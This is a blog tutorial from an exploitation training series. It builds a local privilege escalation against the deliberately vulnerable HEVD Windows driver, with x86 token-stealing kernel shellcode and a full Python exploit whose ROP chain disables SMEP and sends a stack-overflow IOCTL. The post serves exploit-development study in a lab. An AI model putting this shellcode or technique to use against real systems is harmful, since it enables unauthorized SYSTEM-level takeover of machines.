---
slug: hevd-privilege-escalation/
title: 'HEVD: Local Privilege Escalation'
date: 2020-09-24
category: attacks
subtitle: Local Privilege Escalation
tags: osee, training, exploit, windows, kernel, hevd
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620330911/blog/hevd-privilege-escalation/cover_hrrhjs.webp
alt: Photo by Christina @ wocintechchat.com on Unsplash
description: In this article we will be able to perform a Local Privilege
  Escalation using an exploit to HEVD
keywords: Business, Information, Security, Protection, Hacking, Exploit,
  OSEE, Ethical Hacking, Pentesting
author: Andres Roldan
writer: aroldan
name: Andres Roldan
about1: Cybersecurity Specialist, OSCE, OSCP, CHFI
about2: We don't need the key, we'll break in — RATM
source: https://unsplash.com/photos/F75IfIWSqRY
---

This is the fourth article on where we’ve been through Windows Kernel
exploitation, using [HackSys Extremely Vulnerable
Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)
or `HEVD` as the target. In the previous articles, we’ve covered:

- [Lab setup](../windows-kernel-debugging/), describing the tools and
  environment needed to do Windows Kernel debugging.

- [Denial of Service](../hevd-dos/) in which we performed an initial
  attack to `HEVD`.

- [kASLR SMEP](../hevd-smep-bypass/) were also successfully bypassed
  and we could execute a simple shellcode in kernel mode.

In this article we will be able to obtain a privileged `SYSTEM` shell,
performing a Local Privilege Escalation by stealing security tokens. We
will also need to successfully resume execution of our OS after the
attack, to avoid any crash.

## Security token stealing

When we are attacking the kernel, we are supposed to have unprivileged
access to the target machine. That’s why the common exploit goal is to
perform Local Privilege Escalation which means to get full privileges on
the OS. There are [several
methods](https://securityintelligence.com/identifying-named-pipe-impersonation-and-other-malicious-privilege-escalation-techniques/)
that can be used to do that. Most of them (ab)use the privilege model
implemented by Windows.

In Windows, when the system starts, a process called `System` is
created, always with `PID` 4. As this process is owned by the `SYSTEM`
user, we will use this as the target process to steal the ticket from.

<div class="imgblock">

![SYSTEM
processes](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330910/blog/hevd-privilege-escalation/sysprocess2_fprfev.webp)

</div>

Each process has a `EPROCESS` structure.

<div class="imgblock">

![EPROCESS
structure](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330910/blog/hevd-privilege-escalation/eprocess1_mmonli.webp)

</div>

One of the members of that structure is `Token` which is a ticket
granted by the `LSASS` process.

<div class="imgblock">

![Security
Token](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330909/blog/hevd-privilege-escalation/token1_vggzjy.webp)

</div>

The token is used to perform operations on the system based on the
permissions granted to it. For example, if a process wants to read a
file, that file security descriptor will check if the token of process
has the permissions to do it. This is what is known as Discretionary
Access Control List or `DACL`.

In Windows, the `SYSTEM` token has all the permissions granted on all
the system objects (files, processes, devices, pipes, etc). That’s why,
if we are able to steal that token and insert it to a non-privileged
process, that process will gain `SYSTEM` privileges.

To do that, we first need to get the offset of the `Token` field in the
`EPROCESS` structure:

<div class="imgblock">

![Security
Token](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330909/blog/hevd-privilege-escalation/token2_yrbmfg.webp)

</div>

As you see, it is at `_EPROCESS+0x0fc`. With that, we need to get the
`SYSTEM` process descriptor:

<div class="imgblock">

![SYSTEM
process](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330909/blog/hevd-privilege-escalation/sysprocess1_tpnrcu.webp)

</div>

Then, we need to get the value of the token for the `SYSTEM` process:

<div class="imgblock">

![SYSTEM token
value](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330911/blog/hevd-privilege-escalation/tokenvalue1_kvahmc.webp)

</div>

Now, we launch a `cmd.exe` process on the target OS and get the current
privileges:

<div class="imgblock">

![Before Privilege
Escalation](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330910/blog/hevd-privilege-escalation/before1_pxrxmn.webp)

</div>

We must get the `cmd.exe` process descriptor:

<div class="imgblock">

![CMD
process](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330910/blog/hevd-privilege-escalation/cmdprocess1_xtjbqg.webp)

</div>

Finally, we must copy the value of the token of the `SYSTEM` process to
the `cmd.exe` process. Let’s see it in action:

<div class="imgblock">

![Local Privilege
Escalation](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330910/blog/hevd-privilege-escalation/lpe1_hb1a8f.gif)

</div>

Wonderful\! As you can see, our `cmd.exe` is now running as `nt
authority\system`\!

**NOTE:** We need to remember that the offsets described in this article
are only applicable for the Windows version that we are currently using:
Windows 10 1703 32 bits.

Now, we must make this process programmatically if we want to include it
in our exploit. The strategy is the following:

- Look for a fixed starting point that we can use to calculate
  offsets, using position-independent code.

- Get the current process list.

- Find the `cmd.exe` process.

- Find the `SYSTEM` process (with `PID` 4).

- Grab the `Token` from the `SYSTEM` process.

- Copy the token from process `SYSTEM` to the `cmd.exe` process.

- Restore execution.

- Enjoy.

The first step is to find a fixed position from where we can get the
required structures as an offset. According to [this
entry](https://en.wikipedia.org/wiki/Win32_Thread_Information_Block), we
can access the `_NT_TIB` structure from the `fs` segment selector. This
structure holds information of the current running thread (in our case,
that would be the exploit). The article also says that we can reach the
`_KTHREAD` structure at `fs+0x124`. With that, we can start writing some
assembler:

``` x86asm
pushad                                  ; Save current registers
mov eax, dword fs:[0x124]               ; EAX now points to _KTHREAD
```

In the `_KTHREAD` structure we can find an offset to the `_KPROCESS`.

<div class="imgblock">

![KTHREAD
KPROCESS](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330910/blog/hevd-privilege-escalation/kthread1_ghbqtt.webp)

</div>

It turns out that `_KPROCESS` is the first field of `_EPROCESS`, which
means that we can access the `_EPROCESS` structure at `_KTHREAD+0x150`:

``` x86asm
pushad                                  ; Save current registers
mov eax, dword fs:[0x124]               ; EAX now points to _KTHREAD
mov eax, dword [eax+0x150]              ; EAX now points to _EPROCESS
```

The `_EPROCESS` structure holds the required offsets to the other needed
information:

- `_EPROCESS+0x0b8` points to `ActiveProcessLinks` which is a linked
  list holding the current running processes, and `_EPROCESS+0x0b4`
  points to the current process `PID`:

<div class="imgblock">

![Active Process
Links](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330910/blog/hevd-privilege-escalation/activeprocess1_krqcw8.webp)

</div>

- `_EPROCESS+0x140` points to `InheritedFromUniqueProcessId` which
  will contain the `PID` of the parent process, in our case the `PID`
  of `cmd.exe`:

<div class="imgblock">

![Parent
Pid](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330909/blog/hevd-privilege-escalation/parentpid1_msemxx.webp)

</div>

With that, we need to save the `PID` of `cmd.exe`:

``` x86asm
pushad                                  ; Save current registers
mov eax, dword fs:[0x124]               ; EAX now points to _KTHREAD
mov eax, dword [eax+0x150]              ; EAX now points to _EPROCESS
mov edx, dword [eax+0x140]              ; EDX now points to cmd.exe PID
```

Now we need to traverse the `ActiveProcessLinks` list to find the
`_EPROCESS` structure for the `cmd.exe` process:

``` x86asm
pushad                                  ; Save current registers
mov eax, dword [fs:0x124]               ; EAX now points to _KTHREAD
mov eax, dword [eax+0x150]              ; EAX now points to _EPROCESS
mov edx, dword [eax+0x140]              ; EDX now points to cmd.exe PID
mov ecx, eax                            ; ECX will be used to iterate over ActiveProcessLinks
find_cmd:
mov ecx, dword [ecx+0x0b8]              ; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], edx              ; Check if this entry belongs to `cmd.exe`
jne find_cmd                            ; If not, go to the next entry of ActiveProcessLinks
```

Then, find the `_EPROCESS` structure for the `SYSTEM` process:

``` x86asm
pushad                                  ; Save current registers
mov eax, dword [fs:0x124]               ; EAX now points to _KTHREAD
mov eax, dword [eax+0x150]              ; EAX now points to _EPROCESS
mov edx, dword [eax+0x140]              ; EDX now points to cmd.exe PID
mov ecx, eax                            ; ECX will be used to iterate over ActiveProcessLinks
find_cmd:
mov ecx, dword [ecx+0x0b8]              ; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], edx              ; Check if this entry belongs to `cmd.exe`
jne find_cmd                            ; If not, go to the next entry of ActiveProcessLinks
mov edi, ecx                            ; EDI now points to cmd.exe _EPROCESS
mov ecx, eax                            ; Rewind to interate using ECX over ActiveProcessLinks
find_system:
mov ecx, dword [ecx+0x0b8]              ; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], 4                ; Check if this entry belongs to PID 4 = SYSTEM
jne find_system                         ; If not, go to the next entry of ActiveProcessLinks
```

We then must move the token from `SYSTEM` to `cmd.exe`:

``` x86asm
pushad                                  ; Save current registers
mov eax, dword [fs:0x124]               ; EAX now points to _KTHREAD
mov eax, dword [eax+0x150]              ; EAX now points to _EPROCESS
mov edx, dword [eax+0x140]              ; EDX now points to cmd.exe PID
mov ecx, eax                            ; ECX will be used to iterate over ActiveProcessLinks
find_cmd:
mov ecx, dword [ecx+0x0b8]              ; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], edx              ; Check if this entry belongs to `cmd.exe`
jne find_cmd                            ; If not, go to the next entry of ActiveProcessLinks
mov edi, ecx                            ; EDI now points to cmd.exe _EPROCESS
mov ecx, eax                            ; Rewind to interate using ECX over ActiveProcessLinks
find_system:
mov ecx, dword [ecx+0x0b8]              ; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], 4                ; Check if this entry belongs to PID 4 = SYSTEM
jne find_system                         ; If not, go to the next entry of ActiveProcessLinks
add ecx, 0x0fc                          ; ECX now points to the Token of SYSTEM
mov ecx, [ecx]                          ; Copy contents of Token to ECX
mov [edi+0x0fc], ecx                    ; Move the Token of SYSTEM to cmd.exe
```

And finally restore execution. As we are writing in the stack, we had
surely mangled immediate stack frames of caller functions. If we look at
the stack after executing the shellcode, we can see that there is a
stack frame at which we can return to, located at `esp+0x10`:

<div class="imgblock">

![Previous unmangled stack
frame](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330909/blog/hevd-privilege-escalation/prev-ebp1_vmscb7.webp)

</div>

With that, we can add a restore point to our shellcode:

``` x86asm
pushad
mov eax, dword [fs:0x124]               ; EAX now points to _KTHREAD
mov eax, dword [eax+0x150]              ; EAX now points to _EPROCESS
mov edx, dword [eax+0x140]              ; EDX now points to cmd.exe PID
mov ecx, eax                            ; ECX will be used to iterate over ActiveProcessLinks
find_cmd:
mov ecx, dword [ecx+0x0b8]              ; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], edx              ; Check if this entry belongs to `cmd.exe`
jne find_cmd                            ; If not, go to the next entry of ActiveProcessLinks
mov edi, ecx                            ; EDI now points to cmd.exe _EPROCESS
mov ecx, eax                            ; Rewind to interate using ECX over ActiveProcessLinks
find_system:
mov ecx, dword [ecx+0x0b8]              ; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], 4                ; Check if this entry belongs to PID 4 = SYSTEM
jne find_system                         ; If not, go to the next entry of ActiveProcessLinks
add ecx, 0x0fc                          ; ECX now points to the Token of SYSTEM
mov ecx, [ecx]                          ; Copy contents of Token to ECX
mov [edi+0x0fc], ecx                    ; Move the Token of SYSTEM to cmd.exe
popad                                   ; Restore
xor eax,eax
inc eax
add esp,0x10
pop ebp
ret 8
```

Now, we can compile that code with:

``` console
> nasm -f elf32 -o steal.o steal.asm
```

And get the shellcode with:

``` console
$ for i in $(objdump -d steal.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\x60\x64\xa1\x24\x01\x00\x00\x8b\x80\x50\x01\x00\x00\x8b\x90\x40\x01\x00\x00
\x89\xc1\x8b\x89\xb8\x00\x00\x00\x81\xe9\xb8\x00\x00\x00\x39\x91\xb4\x00\x00
\x00\x75\xec\x89\xcf\x89\xc1\x8b\x89\xb8\x00\x00\x00\x81\xe9\xb8\x00\x00\x00
\x83\xb9\xb4\x00\x00\x00\x04\x75\xeb\x81\xc1\xfc\x00\x00\x00\x8b\x09\x89\x8f
\xfc\x00\x00\x00\x61\x31\xc0\x40\x83\xc4\x10\x5d\xc2\x08\x00
```

Let’s pick the exploit from the [last post](../hevd-smep-bypass/), and
update the shellcode. I also added some `print` calls that helps to
trace at what stage of the exploit we are now:

``` python
#!/usr/bin/env python3
"""
HackSysExtremeVulnerableDrive Stack Overflow.

Vulnerable Software: HackSysExtremeVulnerableDrive
Version: 3.00
Exploit Author: Andres Roldan
Tested On: Windows 10 1703
Writeup: https://fluidattacks.com/blog/hevd-privilege-escalation/
"""

import struct
import sys
from ctypes import windll, c_int, c_ulong, byref, sizeof
from infi.wioctl import DeviceIoControl

KERNEL32 = windll.kernel32
PSAPI = windll.psapi
DEVICE_NAME = r'\\.\HackSysExtremeVulnerableDriver'
IOCTL_HEVD_STACK_OVERFLOW = 0x222003


def get_kernel_base():
    """Obtain kernel base address."""
    buff_size = 0x4

    base = (c_ulong * buff_size)(0)

    if not PSAPI.EnumDeviceDrivers(base, sizeof(base), byref(c_ulong())):
        print('Failed to get kernel base address.')
        sys.exit(1)
    return base[0]


BASE_ADDRESS = get_kernel_base()
print(f'Obtained kernel base address: {hex(BASE_ADDRESS)}')

SHELLCODE = (
    b'\x60\x64\xa1\x24\x01\x00\x00\x8b\x80\x50\x01\x00\x00\x8b\x90\x40\x01'
    b'\x00\x00\x89\xc1\x8b\x89\xb8\x00\x00\x00\x81\xe9\xb8\x00\x00\x00\x39'
    b'\x91\xb4\x00\x00\x00\x75\xec\x89\xcf\x89\xc1\x8b\x89\xb8\x00\x00\x00'
    b'\x81\xe9\xb8\x00\x00\x00\x83\xb9\xb4\x00\x00\x00\x04\x75\xeb\x81\xc1'
    b'\xfc\x00\x00\x00\x8b\x09\x89\x8f\xfc\x00\x00\x00\x61\x31\xc0\x40\x83'
    b'\xc4\x10\x5d\xc2\x08\x00'
)

print('Allocating memory for shellcode...')
RET_PTR = KERNEL32.VirtualAlloc(
    c_int(0),                    # lpAddress
    c_int(len(SHELLCODE)),       # dwSize
    c_int(0x3000),               # flAllocationType = MEM_COMMIT | MEM_RESERVE
    c_int(0x40)                  # flProtect = PAGE_EXECUTE_READWRITE
)

print('Moving shellcode to heap...')
KERNEL32.RtlMoveMemory(
    c_int(RET_PTR),              # Destination
    SHELLCODE,                   # Source
    c_int(len(SHELLCODE))        # Length
)

print('Creating ROP chain...')
ROP_CHAIN = (
    struct.pack('<L', BASE_ADDRESS + 0x0002bbef) +     #  pop eax # ret
    struct.pack('<L', 0x42424242) +                    #  Padding for ret 8
    struct.pack('<L', 0x42424242) +                    #
    struct.pack('<L', 0x000406e9) +                    #  Value to disable SMEP
    struct.pack('<L', BASE_ADDRESS + 0x0011f8de) +     #  mov cr4, eax # ret
    struct.pack('<L', RET_PTR)                         #  Pointer to shellcode
)

PAYLOAD = (
    b'A' * 2080 +
    ROP_CHAIN
)

SIZE = len(PAYLOAD)

print('Opening driver handle...')
HANDLE = DeviceIoControl(DEVICE_NAME)
print('Sending payload...')
HANDLE.ioctl(IOCTL_HEVD_STACK_OVERFLOW, PAYLOAD, SIZE, 0, 0)
print('Done.')

sys.exit(0)
```

And check it:

<div class="imgblock">

![Success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330910/blog/hevd-privilege-escalation/success_flunbs.gif)

</div>

Glorious\! We were able to steal the token of the `SYSTEM` process and
copy it to our `cmd.exe` shell. Now, we own the system\!

## Conclusions

It was fun to steal the `SYSTEM` process token and pass it to our own
parent process. There are many other ways of gaining Local Privilege
Escalation but this method is one of the most used because it is
extremely reliable if you can restore the execution of the kernel.
